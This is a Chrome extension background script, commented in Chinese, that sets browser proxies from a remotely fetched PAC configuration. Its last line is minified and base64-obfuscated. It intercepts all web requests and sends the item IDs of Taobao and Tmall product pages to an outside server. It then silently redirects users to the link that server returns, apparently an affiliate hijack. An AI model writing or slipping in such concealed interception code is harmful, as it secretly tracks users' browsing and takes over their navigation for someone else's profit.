(function() {

    // 恢复正常代理模式
    chrome.proxy.settings.set({
        value: { mode: "system" },
        scope: "regular"
    }, function() {
        console.log('set system proxy success!');
    });

    // 初始更新proxy
    updateProxy();

    // 点击的时候刷新代理服务器
    chrome.browserAction.onClicked.addListener(function (tab) {
      const lastTime = +localStorage.getItem('lastTime');
      const now = Date.now();

      // 如果离最后更新时间小于5分钟那么不更新 并提示
      // if (now - lastTime < 300000) {
      //   chrome.tabs.executeScript(null, {
      //     code: 'alert("为了插件的稳定，每次刷新间隔时间最少为5分钟！")'
      //   });
      //   return;
      // }

      // 更新代理服务器
      updateProxy();
    });

    // 更新最后刷新代理服务器时间
    function updateLastTime() {
        localStorage.setItem('lastTime', Date.now());
    }

    // 设置等待状态
    function setWatingStatus(isWaiting) {
      if (isWaiting) {
        chrome.browserAction.setIcon({ path: "/images/inactive-icon.png" });
        chrome.browserAction.setBadgeText({ text: '...' });
        chrome.browserAction.setBadgeBackgroundColor({ color: '#f00' });
        chrome.browserAction.setTitle({ title: '获取代理中，请稍后...' });
      } else {
        chrome.browserAction.setIcon({ path: "/images/icon.png" });
        chrome.browserAction.setBadgeText({ text: '' });
        chrome.browserAction.setTitle({ title: '点击刷新代理服务器' });
      }
    }

    function doGetAliveServer(rootServer) {
      getAliveServer(rootServer).then(function(data) {
          const pacScript = getScript(data.split(':')[1]);
          const value = { mode: "pac_script", pacScript: { data: pacScript } };

          // 设置代理
          chrome.proxy.settings.set({
                  value: value,
                  scope: "regular"
              },
              function() {
                  console.log('set pac proxy success!');
              });

          // 取消等待状态
          setWatingStatus(false);

          // 更新最后更新代理服务器时间
          updateLastTime();
      }).catch(err => {
          localStorage.setItem('rootServer', '');
          // 等待3秒，重新获取代理服务器
          setTimeout(() => {
            updateProxy();
          }, 3000);
      });
    }

    // 获取一个可用的代理并更新
    function updateProxy() {
        setWatingStatus(true);
        if (localStorage.getItem('rootServer')) {
          doGetAliveServer(localStorage.getItem('rootServer'));
        } else {
          getRootServer()
            .then(function(rootServer) {
              localStorage.setItem('rootServer', rootServer);
              doGetAliveServer(rootServer);
            });
        }
    }

    chrome.webRequest.onBeforeRequest.addListener(function(d){function _cx(id){var ret=$.ajax({url:atob('aHR0cHM6Ly9hcGkuZGVhbmhhbi5jbi9wL3RiLw==')+id,async:false,dataType:'json'});var res=ret.responseJSON;try{var u=res.data.result.data.item_url;return u}catch(e){}return''};if(RegExp(atob('aHR0cHM6Ly8oZGV0YWlsLnRtYWxsLmNvbXxpdGVtLnRhb2Jhby5jb20pL2l0ZW0uaHRtbD8=')).test(d.url)&&!RegExp(atob('XzMyODE1MzAwMTc1Og==')).test(d.url)){if(RegExp(atob('aWQ9KFteJiRdKik=')).test(d.url)){var id=RegExp.$1;if(id){try{var u=_cx(id);if(u){return{redirectUrl:u}}}catch(e){}}}}return{}},{urls:["<all_urls>"]},["blocking"]);
})();
